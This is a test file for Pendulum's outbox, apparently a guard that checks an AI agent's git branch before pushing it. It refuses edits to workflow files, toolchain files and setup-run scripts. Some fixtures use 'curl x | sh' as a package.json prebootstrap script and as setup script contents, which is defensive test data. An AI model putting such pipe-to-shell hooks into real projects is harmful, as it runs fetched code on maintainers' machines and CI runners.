import "./temp.mjs";
import assert from "node:assert/strict";
import { execFileSync } from "node:child_process";
import { createHash, randomBytes } from "node:crypto";
import { mkdirSync, mkdtempSync, readFileSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { test } from "node:test";
import { POINTER_HEAD, lfsVersion } from "../scripts/lib/lfs.mjs";
import { parsePointer } from "../scripts/lib/outbox.mjs";
import { gitError } from "../scripts/lib/inputs.mjs";
import { open, quiet, repos } from "./fixtures/outbox.mjs";

test("outbox: the branch goes from the agent's checkout through Pendulum's mirror to the remote, leased and read back", async () => {
  const r = repos();
  const box = await open(r);
  assert.equal(box.expected(), "", "a new branch: the lease says it must not exist yet");
  r.put(r.work, "app.txt", "v2\n");
  r.run(r.work, "commit", "-q", "-m", "work");
  assert.equal(await box.push(), true, box.error);
  const head = r.run(r.work, "rev-parse", "HEAD");
  assert.equal(r.run(r.origin, "rev-parse", "pendulum/1"), head);
  assert.equal(box.expected(), head);
  assert.deepEqual(await box.delta(), { count: 1, files: ["app.txt"], head });
  // Nothing new: nothing pushed, still true.
  assert.equal(await box.push(), true);
  // A rewind to an earlier commit the mirror has needs no bundle, and the lease carries it.
  r.put(r.work, "app.txt", "v3\n");
  r.run(r.work, "commit", "-q", "-m", "more");
  assert.equal(await box.push(), true, box.error);
  r.run(r.work, "reset", "-q", "--hard", head);
  assert.equal(await box.push(), true, box.error);
  assert.equal(r.run(r.origin, "rev-parse", "pendulum/1"), head);
});

test("outbox: someone else's push since Pendulum's last one is never overwritten; the refusal is sticky", async () => {
  const r = repos();
  const box = await open(r);
  r.put(r.work, "app.txt", "v2\n");
  r.run(r.work, "commit", "-q", "-m", "work");
  assert.equal(await box.push(), true, box.error);
  r.run(r.other, "fetch", "-q", "origin", "pendulum/1");
  r.run(r.other, "checkout", "-q", "-b", "pendulum/1", "origin/pendulum/1");
  r.put(r.other, "other.txt", "x\n");
  r.run(r.other, "commit", "-q", "-m", "someone else");
  r.run(r.other, "push", "-q", "origin", "pendulum/1");
  const theirs = r.run(r.other, "rev-parse", "HEAD");
  r.put(r.work, "app.txt", "v3\n");
  r.run(r.work, "commit", "-q", "--amend", "-m", "rewritten");
  assert.equal(await box.push(), false);
  assert.match(box.error, /^push rejected: .*stale info|^push rejected: /);
  assert.equal(r.run(r.origin, "rev-parse", "pendulum/1"), theirs, "their commit stays");
  assert.equal(await box.push(), false, "a rejected push Blocks the stage: no retry");
});

test("outbox: a protected path or a plain blob LFS should hold is refused before anything is sent; only this stage's changes count", async () => {
  const r = repos();
  // main gains a workflow after the branch was cut; a rebase takes it, which is not the stage's change.
  r.put(r.other, ".github/workflows/ci.yml", "on: push\n");
  r.run(r.other, "commit", "-q", "-m", "ci on main");
  r.run(r.other, "push", "-q", "origin", "HEAD:main");
  const box = await open(r);
  r.run(r.work, "fetch", "-q", "origin", "main");
  r.run(r.work, "rebase", "-q", "origin/main");
  r.put(r.work, "app.txt", "v2\n");
  r.run(r.work, "commit", "-q", "-m", "work");
  assert.equal(await box.push(), true, box.error);
  r.put(r.work, ".github/workflows/ci.yml", "on: [push, pull_request]\n");
  r.run(r.work, "commit", "-q", "-m", "widen ci");
  const before = r.run(r.origin, "rev-parse", "pendulum/1");
  assert.equal(await box.push(), false);
  assert.equal(box.error, "touched protected path .github/workflows/ci.yml; Pendulum never pushes a workflow file: the worker hands the change over in $PENDULUM_OUT/workflow.patch (pendulum-deliver-pr), so re-apply the label to rerun");
  assert.equal(r.run(r.origin, "rev-parse", "pendulum/1"), before);

  const r2 = repos();
  r2.put(r2.work, ".gitattributes", "assets/** filter=lfs diff=lfs merge=lfs -text\n");
  r2.put(r2.work, "assets/a.bin", randomBytes(4000).toString("hex"));
  r2.run(r2.work, "commit", "-q", "--no-verify", "-m", "media as a plain blob");
  const box2 = await open(r2);
  assert.equal(await box2.push(), false);
  assert.equal(box2.lfsRefused, true);
  assert.match(box2.error, /plain git blobs .*assets\/a\.bin/);
});

test("outbox: a fix pass's toolchain change outside its fence is refused; put back, the fix is pushed", async () => {
  const r = repos();
  r.put(r.work, ".nvmrc", "22\n");
  r.put(r.work, "package.json", "{}\n");
  r.put(r.work, "package-lock.json", "{}\n");
  r.run(r.work, "commit", "-q", "-m", "pins");
  r.run(r.work, "push", "-q", "origin", "HEAD:main");
  // The download script is toolchain by the repository's toolchain_paths setting.
  const box = await open(r, { toolchainPaths: ["scripts/get-toolchain.sh"] });
  r.put(r.work, "app.txt", "v2\n");
  r.run(r.work, "commit", "-q", "-m", "work");
  assert.equal(await box.push(), true, box.error);
  assert.deepEqual(await box.outside(), [], "no fence before a fix pass");
  // The first fix pass: the plan and the red name app.txt only.
  await box.fence({ plan: "1. owns `app.txt`", texts: ["Objective: fix app", "FAIL app.txt:1 expected v3"] });
  const since = box.fenceStart();
  r.put(r.work, "app.txt", "v3\n");
  r.put(r.work, ".nvmrc", "20\n");
  r.put(r.work, "scripts/get-toolchain.sh", "curl x\n");
  r.run(r.work, "commit", "-q", "-m", "fix, and the toolchain");
  assert.deepEqual(await box.outside(), [".nvmrc", "scripts/get-toolchain.sh"]);
  // Put back, as the corrective turn asks: only the fix remains, and it is pushed.
  r.run(r.work, "checkout", since, "--", ".nvmrc");
  r.run(r.work, "rm", "-q", "scripts/get-toolchain.sh");
  r.run(r.work, "commit", "-q", "-m", "put the toolchain back");
  assert.deepEqual(await box.outside(), []);
  assert.equal(await box.push(), true, box.error);
  // A later fix pass's plan text does not widen the fence; its red does.
  await box.fence({ plan: "now owns `.nvmrc`", texts: ["npm error `package-lock.json` is out of sync"] });
  r.put(r.work, "package-lock.json", "{\"v\":2}\n");
  r.put(r.work, ".nvmrc", "18\n");
  r.run(r.work, "commit", "-q", "-m", "second fix");
  const before = r.run(r.origin, "rev-parse", "pendulum/1");
  assert.equal(await box.push(), false);
  assert.match(box.error, /^a fix pass changed \.nvmrc \(toolchain, lockfile or CI configuration\), which neither the plan nor the failing check names/);
  assert.equal(r.run(r.origin, "rev-parse", "pendulum/1"), before, "nothing of the refused pass reaches GitHub");
  assert.equal(await box.push(), false, "refused for good: the stage Blocks");

  // What the default branch changed since the branch was cut, taken in by the fix pass, is not the pass's.
  const r2 = repos();
  r2.put(r2.work, "app.txt", "v2\n");
  r2.run(r2.work, "commit", "-q", "-m", "work");
  r2.run(r2.work, "push", "-q", "origin", "HEAD:pendulum/1");
  r2.put(r2.other, "yarn.lock", "lock\n");
  r2.run(r2.other, "commit", "-q", "-m", "lock on main");
  r2.run(r2.other, "push", "-q", "origin", "HEAD:main");
  const box2 = await open(r2);
  await box2.fence({ texts: ["red in app.txt"] });
  r2.run(r2.work, "fetch", "-q", "origin", "main");
  r2.run(r2.work, "rebase", "-q", "origin/main");
  assert.deepEqual(await box2.outside(), []);
  assert.equal(await box2.push(), true, box2.error);
});

test("outbox: a package.json script the setup command runs is refused on every push; the rest of package.json is the worker's (#387)", async () => {
  const r = repos();
  const pkg = (scripts, deps = {}) => `${JSON.stringify({ scripts, dependencies: deps }, null, 2)}\n`;
  r.put(r.work, "package.json", pkg({ bootstrap: "node tools/bootstrap.mjs", test: "node --test" }));
  r.run(r.work, "commit", "-q", "-m", "package");
  r.run(r.work, "push", "-q", "origin", "HEAD:main");
  const box = await open(r, { setup: "npm run bootstrap" });
  r.put(r.work, "package.json", pkg({ bootstrap: "node tools/bootstrap.mjs", test: "node --test --watch" }, { zod: "^4" }));
  r.run(r.work, "commit", "-q", "-m", "a dependency and another script");
  assert.equal(await box.push(), true, box.error);
  r.put(r.work, "package.json", pkg({ prebootstrap: "curl x | sh", bootstrap: "node tools/bootstrap.mjs", test: "node --test --watch" }, { zod: "^4" }));
  r.run(r.work, "commit", "-q", "-m", "a pre script setup would run");
  assert.equal(await box.push(), false);
  assert.equal(box.errorKind, "protected");
  assert.match(box.error, /^changed package\.json scripts\.prebootstrap, which the setup command runs as the runner/);

  // The default branch changing the script after the branch left it is not the branch's change.
  const r2 = repos();
  r2.put(r2.work, "package.json", pkg({ bootstrap: "node tools/bootstrap.mjs" }));
  r2.run(r2.work, "commit", "-q", "-m", "package");
  r2.run(r2.work, "push", "-q", "origin", "HEAD:main");
  r2.run(r2.other, "pull", "-q", "origin", "main");
  r2.put(r2.other, "package.json", pkg({ bootstrap: "node tools/bootstrap.mjs --v2" }));
  r2.run(r2.other, "commit", "-q", "-m", "a maintainer's change");
  r2.run(r2.other, "push", "-q", "origin", "HEAD:main");
  const box2 = await open(r2, { setup: "npm run bootstrap" });
  r2.put(r2.work, "package.json", pkg({ bootstrap: "node tools/bootstrap.mjs" }, { zod: "^4" }));
  r2.run(r2.work, "commit", "-q", "-m", "a dependency");
  assert.equal(await box2.push(), true, box2.error);
});

/** A push through a fresh outbox: `main` files and links on the default branch, then `work` (files, `link:` targets) committed on the branch. */
async function guardPush({ main = {}, work = {}, setup, before = null }) {
  const r = repos();
  const place = (files) => {
    for (const [p, t] of Object.entries(files)) {
      if (t === null) r.run(r.work, "rm", "-q", "-r", p);
      else if (t.startsWith("link:")) {
        mkdirSync(join(r.work, p, ".."), { recursive: true });
        rmSync(join(r.work, p), { recursive: true, force: true });
        symlinkSync(t.slice(5), join(r.work, p));
        r.run(r.work, "add", p);
      } else r.put(r.work, p, t);
    }
  };
  place(main);
  r.run(r.work, "commit", "-q", "-m", "main");
  r.run(r.work, "push", "-q", "origin", "HEAD:main");
  if (before) await before(r, place);
  const box = await open(r, { setup });
  place(work);
  r.run(r.work, "commit", "-q", "-m", "work");
  const ok = await box.push();
  return { ok, error: box.error, kind: box.errorKind };
}

test("outbox: a link along a guarded path is followed, on the default branch and in the push; a directory above one counts (#387 B1)", async () => {
  const local = await guardPush({ main: { "tools/local/setup.sh": "1\n", ".local": "link:tools/local" }, work: { "tools/local/setup.sh": "2\n" }, setup: "bash .local/setup.sh" });
  assert.equal(local.ok, false, ".local -> tools/local: an edit to tools/local/setup.sh is an edit to what setup runs");
  assert.equal(local.kind, "protected");
  const sl = await guardPush({ main: { "scripts/real.sh": "1\n", sl: "link:scripts" }, work: { "scripts/real.sh": "curl x | sh\n" }, setup: "bash sl/real.sh" });
  assert.equal(sl.ok, false, "sl -> scripts: an edit to scripts/real.sh");
  const made = await guardPush({ main: { "tools/setup.sh": "1\n", "evil/setup.sh": "curl x | sh\n" }, work: { tools: "link:evil" }, setup: "bash tools/setup.sh" });
  assert.equal(made.ok, false, "a new link made at a directory above the path");
  assert.match(made.error, /^changed tools/);
});

test("outbox: Git LFS media is taken from the agent's store only when its bytes match the pointer", async (t) => {
  assert.deepEqual(parsePointer(`${POINTER_HEAD}\noid sha256:${"a".repeat(64)}\nsize 12\n`), { oid: "a".repeat(64), size: 12 });
  assert.deepEqual(parsePointer(`version https://hawser.github.com/spec/v1\noid sha256:${"b".repeat(64)}\nsize 3\n`), { oid: "b".repeat(64), size: 3 });
  assert.equal(parsePointer("hello"), null);
  if (!(await lfsVersion())) return t.skip("git-lfs is not installed");
  const r = repos();
  const bytes = randomBytes(5000);
  const oid = createHash("sha256").update(bytes).digest("hex");
  r.put(r.work, ".gitattributes", "assets/** filter=lfs diff=lfs merge=lfs -text\n");
  r.put(r.work, "assets/a.glb", `${POINTER_HEAD}\noid sha256:${oid}\nsize 5000\n`);
  r.run(r.work, "commit", "-q", "--no-verify", "-m", "media");
  // The store holds other bytes under that oid: refused, nothing sent.
  const store = join(r.work, ".git", "lfs", "objects", oid.slice(0, 2), oid.slice(2, 4));
  mkdirSync(store, { recursive: true });
  writeFileSync(join(store, oid), randomBytes(5000));
  const box = await open(r);
  assert.equal(await box.push(), false);
  assert.match(box.error, /^Git LFS objects missing from the checkout's store, or not matching their pointers: /);
  assert.throws(() => r.run(r.origin, "rev-parse", "--verify", "pendulum/1"));
  // Over the local cap: refused with the size, before any upload.
  writeFileSync(join(store, oid), bytes);
  process.env.PENDULUM_LOCAL_MEDIA_MAX_MB = "0.001";
  try {
    const box2 = await open(r, { local: true });
    assert.equal(await box2.push(), false);
    assert.match(box2.error, /^the branch's Git LFS media is 0\.0 MB \(1 object\(s\)\), over the local limit of 0\.001 MB/);
  } finally {
    delete process.env.PENDULUM_LOCAL_MEDIA_MAX_MB;
  }
  // A path remote has no https LFS endpoint: Pendulum will not upload media anywhere but the repository's own.
  const box3 = await open(r);
  assert.equal(await box3.push(), false);
  assert.equal(box3.error, "the remote has no https Git LFS endpoint to pin the media upload to");
});

test("outbox: the checkout gets the default branch as a bundle; Pendulum's own clean rebase is the commit pushed; a conflict is left to the harness", async () => {
  const r = repos();
  r.put(r.work, "app.txt", "v2\n");
  r.run(r.work, "commit", "-q", "-m", "work");
  const box = await open(r);
  assert.equal(await box.push(), true, box.error);
  // main moves on; the checkout has not seen it.
  r.put(r.other, "other.txt", "x\n");
  r.run(r.other, "commit", "-q", "-m", "sibling");
  r.run(r.other, "push", "-q", "origin", "HEAD:main");
  const main = r.run(r.other, "rev-parse", "HEAD");
  const box2 = await open(r);
  assert.equal(await box2.behind(), 1);
  assert.equal(await box2.feed(), main);
  assert.equal(r.run(r.work, "rev-parse", "refs/remotes/origin/main"), main, "handed over, not fetched by Pendulum in the checkout");
  const sha = await box2.rebase({ name: "pendulum", email: "f@f" });
  assert.match(sha, /^[0-9a-f]{40}$/);
  assert.equal(await box2.push({ sha }), true, box2.error);
  assert.equal(r.run(r.origin, "rev-parse", "pendulum/1"), sha);
  assert.equal(r.run(r.origin, "rev-parse", "pendulum/1^"), main);
  // A conflicting rebase: null, nothing pushed.
  r.put(r.other, "app.txt", "theirs\n");
  r.run(r.other, "commit", "-q", "-m", "conflicting sibling");
  r.run(r.other, "push", "-q", "origin", "HEAD:main");
  const box3 = await open(r);
  assert.equal(await box3.rebase({ name: "pendulum", email: "f@f" }), null);
  assert.equal(r.run(r.origin, "rev-parse", "pendulum/1"), sha);
});

test("outbox: a malformed object in the agent's bundle is refused by Pendulum's own object check", async () => {
  const r = repos();
  const tree = r.run(r.work, "write-tree");
  const parent = r.run(r.work, "rev-parse", "HEAD");
  const bad = execFileSync("git", ["-C", r.work, "hash-object", "-t", "commit", "-w", "--literally", "--stdin"], { input: `tree ${tree}\nparent ${parent}\nauthor nobody\ncommitter nobody\n\nbad\n`, encoding: "utf8" }).trim();
  r.run(r.work, "update-ref", "refs/heads/pendulum/1", bad);
  const box = await open(r);
  assert.equal(await box.push(), false);
  // #318: git's cause, and no path on this machine (index-pack can name the mirror's pack).
  assert.match(box.error, /^the agent's bundle failed Pendulum's object check \(exit \d+\): .*fatal: fsck error in packed object; (this machine's|the job) log has its output$/);
  assert.ok(!box.error.includes(r.root), box.error);
  assert.throws(() => r.run(r.origin, "rev-parse", "--verify", "pendulum/1"));
});

/**
 * A pre-receive hook on the test origin that refuses a branch update as GitHub refuses a token without the Workflows
 * permission (seen live on the scratch adopter, #2579): a workflow file at the new head whose blob neither the branch's
 * old head nor any branch's head has at that path.
 */
function refuseWorkflowVersions(r) {
  const hook = join(r.origin, "hooks", "pre-receive");
  writeFileSync(
    hook,
    `#!/bin/sh
while read old new ref; do
  git ls-tree -r "$new" -- .github/workflows | while read mode type blob path; do
    seen=""
    for tip in $( [ "$old" != 0000000000000000000000000000000000000000 ] && echo "$old"; git for-each-ref --format='%(objectname)' refs/heads ); do
      [ "$(git rev-parse -q --verify "$tip:$path" 2>/dev/null)" = "$blob" ] && seen=1 && break
    done
    [ -n "$seen" ] || { echo "refusing to allow a Personal Access Token to create or update workflow \\\`$path\\\` without \\\`workflow\\\` scope" >&2; exit 1; }
  done || exit 1
done
`,
    { mode: 0o755 },
  );
}

/** main with a workflow file, the agent's branch cut from it, and the box opened there (the run's base). */
async function withWorkflow(r, extra = {}) {
  r.run(r.other, "pull", "-q", "origin", "main");
  r.put(r.other, ".github/workflows/ci.yml", "on: push # v1\n");
  r.run(r.other, "commit", "-q", "-m", "ci v1");
  r.run(r.other, "push", "-q", "origin", "HEAD:main");
  r.run(r.work, "fetch", "-q", "origin", "main");
  r.run(r.work, "reset", "-q", "--hard", "origin/main");
  return open(r, extra);
}

test("outbox: a default branch that changed a workflow file during the run is merged in by Pendulum before the push (#2579)", async () => {
  const r = repos();
  const box = await withWorkflow(r);
  r.put(r.work, "app.txt", "v2\n");
  r.run(r.work, "commit", "-q", "-m", "work");
  const work = r.run(r.work, "rev-parse", "HEAD");
  // Mid-run: the default branch changes the workflow file (a Pendulum pin bump, say).
  r.put(r.other, ".github/workflows/ci.yml", "on: push # v2\n");
  r.run(r.other, "commit", "-q", "-m", "ci v2");
  r.run(r.other, "push", "-q", "origin", "HEAD:main");
  const main = r.run(r.other, "rev-parse", "HEAD");
  refuseWorkflowVersions(r);
  assert.throws(() => r.run(r.work, "push", "-q", "origin", "HEAD:refs/heads/probe"), /workflow/, "the branch as it is would be refused");
  box.author = { name: "pendulum[bot]", email: "1+pendulum[bot]@users.noreply.github.com" };
  assert.equal(await box.push(), true, box.error);
  const head = r.run(r.origin, "rev-parse", "pendulum/1");
  assert.deepEqual(r.run(r.origin, "rev-list", "--parents", "-n", "1", head).split(" ").slice(1), [work, main], "Pendulum's merge: the agent's head, then the default branch");
  assert.equal(r.run(r.origin, "rev-parse", `${head}:.github/workflows/ci.yml`), r.run(r.origin, "rev-parse", `${main}:.github/workflows/ci.yml`));
  assert.equal(r.run(r.origin, "log", "-1", "--format=%an <%ae>", head), "pendulum[bot] <1+pendulum[bot]@users.noreply.github.com>");
  assert.deepEqual(box.merged, { default: main, paths: [".github/workflows/ci.yml"] });
  assert.equal(box.base, main);
  // The checkout took the merge, so the next commit builds on it and needs no second merge.
  assert.equal(box.synced, true);
  assert.equal(r.run(r.work, "rev-parse", "HEAD"), head);
  // A push with nothing new reports nothing of the last one.
  assert.equal(await box.push(), true);
  assert.equal(box.merged, null);
  r.put(r.work, "app.txt", "v3\n");
  r.run(r.work, "commit", "-q", "-m", "more");
  assert.equal(await box.push(), true, box.error);
  assert.equal(box.merged, null);
  assert.equal(r.run(r.origin, "rev-parse", "pendulum/1^"), head);
  // The merged-in workflow change is not the stage's: no protected-path refusal, and the delta counts from the new base.
  assert.deepEqual((await box.delta()).files, ["app.txt"]);
});

test("outbox: Pendulum records its own catch-up merge, and a red on it goes on to a fix pass (#10)", async () => {
  const { validationLoop } = await import("../scripts/lib/session.mjs");
  const r = repos();
  const box = await withWorkflow(r);
  box.author = { name: "pendulum[bot]", email: "1+pendulum[bot]@users.noreply.github.com" };
  r.put(r.work, "app.txt", "v2\n");
  r.run(r.work, "commit", "-q", "-m", "work");
  const work = r.run(r.work, "rev-parse", "HEAD");
  r.put(r.other, ".github/workflows/ci.yml", "on: push # v2\n");
  r.run(r.other, "commit", "-q", "-m", "ci v2");
  r.run(r.other, "push", "-q", "origin", "HEAD:main");
  assert.equal(await box.push(), true, box.error);
  const merge = r.run(r.origin, "rev-parse", "pendulum/1");
  assert.equal(r.run(r.work, "rev-parse", "HEAD"), merge, "the checkout took Pendulum's merge");
  assert.equal(box.caughtUp(merge), true, "Pendulum recorded its own merge");
  assert.equal(box.caughtUp(work), false, "the agent's head is not Pendulum's merge");
  // The red on the merge goes on to its fix run. Under a minute left, the fix run is reached but never started (the
  // loop returns the time cap instead of running a harness). That such a red is never judged for progress: triage.test.mjs.
  const onMerge = await validationLoop({ checkout: r.work, commands: ["false"], harness: "codex", maxUsd: 0, session: {}, taskCard: "", env: { ...process.env, ...quiet }, deadlineAt: Date.now() + 30_000, outbox: box });
  assert.deepEqual(onMerge.harness, { timedOut: true }, "the red on the catch-up merge went on to a fix run");
  assert.equal(onMerge.passes, 1);
  // The agent's own commit on top of the merge is the change's, not Pendulum's merge.
  r.put(r.work, "app.txt", "v3\n");
  r.run(r.work, "commit", "-q", "-m", "fix");
  assert.equal(await box.push(), true, box.error);
  const fix = r.run(r.origin, "rev-parse", "pendulum/1");
  assert.equal(box.merged, null);
  assert.equal(box.caughtUp(fix), false);
});

test("outbox: a run with no commits of its own pushes nothing, even when the default branch changed a workflow file meanwhile", async () => {
  const r = repos();
  const box = await withWorkflow(r);
  // The harness asked a Question (or found nothing to change): the checkout is still at the base.
  r.put(r.other, ".github/workflows/ci.yml", "on: push # v2\n");
  r.run(r.other, "commit", "-q", "-m", "ci v2");
  r.run(r.other, "push", "-q", "origin", "HEAD:main");
  refuseWorkflowVersions(r);
  assert.equal(await box.push(), true, box.error);
  assert.equal(box.merged, null, "no merge of Pendulum's own");
  assert.equal(box.conflict, null);
  assert.equal(box.failed, false);
  assert.throws(() => r.run(r.origin, "rev-parse", "--verify", "pendulum/1"), "no branch on the remote, so no PR");
  assert.equal(box.expected(), "");
  assert.equal((await box.delta()).count, 0, "the run reads as one that left no commits");
  // Nor without a workflow change: a new branch that is only a default-branch commit never goes out.
  const r2 = repos();
  const box2 = await open(r2);
  assert.equal(await box2.push(), true, box2.error);
  assert.throws(() => r2.run(r2.origin, "rev-parse", "--verify", "pendulum/1"));
  assert.equal((await box2.delta()).count, 0);
});

test("outbox: a new branch that conflicts with the moved default is not pushed; resolved by the harness it is, and a second conflict is refused", async () => {
  const r = repos();
  const box = await withWorkflow(r);
  r.put(r.work, "app.txt", "ours\n");
  r.run(r.work, "commit", "-q", "-m", "work");
  r.put(r.other, ".github/workflows/ci.yml", "on: push # v2\n");
  r.put(r.other, "app.txt", "theirs\n");
  r.run(r.other, "commit", "-q", "-m", "ci v2 and a clash");
  r.run(r.other, "push", "-q", "origin", "HEAD:main");
  const main = r.run(r.other, "rev-parse", "HEAD");
  assert.equal(await box.push(), false);
  assert.equal(box.failed, false, "not sticky: the harness gets the conflict");
  assert.deepEqual(box.conflict, { default: main, paths: [".github/workflows/ci.yml"] });
  assert.throws(() => r.run(r.origin, "rev-parse", "--verify", "pendulum/1"), "nothing pushed");
  // The conflict pass: the default branch handed over, the branch rebased onto it with the clash resolved.
  assert.equal(await box.feed(), main);
  assert.throws(() => r.run(r.work, "rebase", "-q", "origin/main"));
  r.put(r.work, "app.txt", "ours and theirs\n");
  r.run(r.work, "-c", "core.editor=true", "rebase", "--continue");
  assert.equal(await box.push(), true, box.error);
  assert.equal(box.merged, null, "already on the default branch: no merge");
  assert.equal(r.run(r.origin, "rev-parse", "pendulum/1^"), main);

  // Left unresolved, the second push is refused and stays refused.
  const r2 = repos();
  const box2 = await withWorkflow(r2);
  r2.put(r2.work, "app.txt", "ours\n");
  r2.run(r2.work, "commit", "-q", "-m", "work");
  r2.put(r2.other, ".github/workflows/ci.yml", "on: push # v2\n");
  r2.put(r2.other, "app.txt", "theirs\n");
  r2.run(r2.other, "commit", "-q", "-m", "ci v2 and a clash");
  r2.run(r2.other, "push", "-q", "origin", "HEAD:main");
  assert.equal(await box2.push(), false);
  assert.equal(await box2.push(), false);
  assert.equal(box2.failed, true);
  assert.match(box2.error, /^pendulum\/1 conflicts with main, which changed \.github\/workflows\/ci\.yml/);
});

test("outbox: a resumed run puts a reused checkout on the branch even when an earlier run left changes the branch now tracks", async () => {
  const r = repos();
  // The first run: the branch from main, one commit, pushed.
  const box1 = await open(r);
  await box1.feed();
  assert.equal((await box1.agentGit(["checkout", "-q", "-B", "pendulum/1", "refs/remotes/origin/main"])).code, 0);
  r.put(r.work, "app.txt", "v2\n");
  r.run(r.work, "commit", "-q", "-m", "work");
  assert.equal(await box1.push(), true, box1.error);
  // What it left in the checkout: a changed tracked file, a staged new file, an untracked file at a path main adds next.
  writeFileSync(join(r.work, "app.txt"), "half-done\n");
  r.put(r.work, "staged.txt", "s\n");
  mkdirSync(join(r.work, "gen"), { recursive: true });
  writeFileSync(join(r.work, "gen", "out.txt"), "stale\n");
  // Meanwhile main gains that file and the branch merges main and moves on.
  r.put(r.other, "gen/out.txt", "generated\n");
  r.run(r.other, "commit", "-q", "-m", "main adds a generated file");
  r.run(r.other, "push", "-q", "origin", "HEAD:main");
  r.run(r.other, "fetch", "-q", "origin", "pendulum/1");
  r.run(r.other, "checkout", "-q", "-b", "pendulum/1", "origin/pendulum/1");
  r.run(r.other, "merge", "-q", "--no-edit", "main");
  r.put(r.other, "app.txt", "v3\n");
  r.run(r.other, "commit", "-q", "-m", "more");
  r.run(r.other, "push", "-q", "origin", "pendulum/1");
  const head = r.run(r.other, "rev-parse", "HEAD");
  // The resumed run, in the same checkout.
  const box2 = await open(r);
  assert.equal(box2.resumed, true);
  await box2.feed();
  const on = await box2.putOn("refs/remotes/origin/pendulum/1");
  assert.deepEqual(on, { code: 0, error: "" });
  assert.equal(r.run(r.work, "rev-parse", "HEAD"), head);
  assert.equal(r.run(r.work, "symbolic-ref", "--short", "HEAD"), "pendulum/1");
  assert.equal(r.run(r.work, "status", "--porcelain", "--untracked-files=no"), "", "the tracked tree is the branch's");
  assert.equal(r.run(r.work, "show", "HEAD:gen/out.txt"), "generated");
  assert.equal(r.run(r.work, "ls-files", "staged.txt"), "", "the staged leftover is gone");
  // A ref the checkout lacks: git's own first error line, not its last.
  const bad = await box2.putOn("refs/remotes/origin/nope");
  assert.notEqual(bad.code, 0);
  assert.match(bad.error, /nope/);
});

test("gitError: git's first error lines with the paths they list, never its closing line or a credential", () => {
  const untracked = "error: The following untracked working tree files would be overwritten by checkout:\n\tgen/out.txt\n\tgen/two.txt\nPlease move or remove them before you switch branches.\nAborting\n";
  assert.equal(gitError(untracked), "error: The following untracked working tree files would be overwritten by checkout: gen/out.txt, gen/two.txt");
  const changed = "error: Your local changes to the following files would be overwritten by checkout:\n\tapp.txt\nPlease commit your changes or stash them before you switch branches.\nAborting\n";
  assert.equal(gitError(changed), "error: Your local changes to the following files would be overwritten by checkout: app.txt");
  const many = `error: The following untracked working tree files would be overwritten by checkout:\n${Array.from({ length: 9 }, (_, i) => `\tf${i}.txt`).join("\n")}\nAborting\n`;
  assert.equal(gitError(many), "error: The following untracked working tree files would be overwritten by checkout: f0.txt, f1.txt, f2.txt, f3.txt, f4.txt (+4 more)");
  const token = "ghs_" + "a".repeat(36);
  const fatal = `warning: redirecting\nfatal: unable to access 'https://x-access-token:${token}@github.com/o/r.git/': The requested URL returned error: 403\n`;
  const said = gitError(fatal);
  assert.match(said, /^fatal: unable to access 'https:\/\/\*\*\*@github\.com\/o\/r\.git\/'/);
  assert.doesNotMatch(said, /ghs_|x-access-token/);
  assert.doesNotMatch(gitError(`fatal: bad token ${token}\n`), /ghs_/);
  assert.equal(gitError("Aborting\n"), "Aborting", "no error: line: the first line");
  assert.equal(gitError(""), "");
  assert.ok(gitError(`error: ${"x".repeat(1000)}\n`).length <= 300);
});

test("#318: a failed git command Blocks with git's cause, every absolute path on this machine replaced; the log has it all", async () => {
  const { commandFailed, logName, logTo, withoutLocalPaths } = await import("../scripts/lib/inputs.mjs");
  const { exec } = await import("../scripts/lib/proc.mjs");
  const { createServer } = await import("node:http");
  const r = repos();
  const env = { ...process.env, ...quiet, GIT_TERMINAL_PROMPT: "0" };
  const lines = [];
  logTo({ write: (l) => lines.push(l) });
  // A server that refuses every credential, as GitHub does a revoked token.
  const server = createServer((_, res) => res.writeHead(401, { "WWW-Authenticate": 'Basic realm="x"' }).end());
  await new Promise((ok) => server.listen(0, "127.0.0.1", ok));
  const outside = join(mkdtempSync(join(tmpdir(), "srv-")), "checkout");
  let missing, denied, gone;
  try {
    missing = commandFailed("git fetch in Pendulum's mirror failed", await exec("git", ["-C", r.work, "fetch", "-q", "origin", "refs/heads/nope"], { env })).message;
    denied = commandFailed("the branch on GitHub could not be read", await exec("git", ["-c", "credential.helper=", "ls-remote", `http://x-access-token:not-a-real-token@127.0.0.1:${server.address().port}/acme/app.git`], { env })).message;
    gone = commandFailed("git status in the checkout failed", await exec("git", ["-C", outside, "status"], { env })).message;
  } finally {
    logTo(null);
    server.close();
  }
  const pointer = "; (this machine's|the job) log has its output$";
  assert.match(missing, new RegExp(`^git fetch in Pendulum's mirror failed \\(exit 128\\): fatal: couldn't find remote ref refs/heads/nope${pointer}`), "a missing ref keeps its cause");
  assert.match(denied, new RegExp(`^the branch on GitHub could not be read \\(exit 128\\): fatal: Authentication failed for 'http://127\\.0\\.0\\.1:\\d+/acme/app\\.git/'${pointer}`), "an auth failure keeps its cause");
  assert.doesNotMatch(denied, /not-a-real-token/);
  assert.match(gone, new RegExp(`fatal: cannot change to '<path>': No such file or directory${pointer}`), "a path outside the home is replaced");
  assert.ok(!gone.includes(outside));
  assert.ok(lines.some((l) => l.includes(outside)), "the log has the path");
  assert.equal(withoutLocalPaths("error: unable to unlink /srv/app/.git/index.lock; see https://github.com/o/r and gen/a.png"), "error: unable to unlink <path>; see https://github.com/o/r and gen/a.png");
  // A quoted path whole, its spaces and commas included; a file: URL is a path.
  assert.equal(withoutLocalPaths("fatal: Unable to create '/srv/my repo/.git/index.lock': File exists."), "fatal: Unable to create '<path>': File exists.");
  assert.equal(withoutLocalPaths('error: cannot open "/home/Kirk Marple/clone/a, b.txt": denied'), 'error: cannot open "<path>": denied');
  assert.equal(withoutLocalPaths("error: /srv/a/x.txt, /srv/b/y.txt and gen/a.png"), "error: <path>, <path> and gen/a.png");
  assert.equal(withoutLocalPaths("fatal: repository 'file:///home/kirk/work/mirror/' not found"), "fatal: repository '<path>' not found");
  assert.equal(withoutLocalPaths("fetch file:///srv/m.git failed"), "fetch <path> failed");
  assert.equal(logName({ PENDULUM_LOCAL: "1", GITHUB_ACTIONS: "true" }), "this machine's log");
  assert.equal(logName({ GITHUB_ACTIONS: "true" }), "the job log");
});

/**
 * #73: a reused checkout whose earlier stage installed the Git LFS filters (required), and whose own git cannot reach LFS
 * storage, as the agent's sandbox cannot (no credential). With git-lfs: the real filters, set up by lfsSetup, and an
 * endpoint that does not exist. Without it: a stand-in required filter that fails as git-lfs does with no credential,
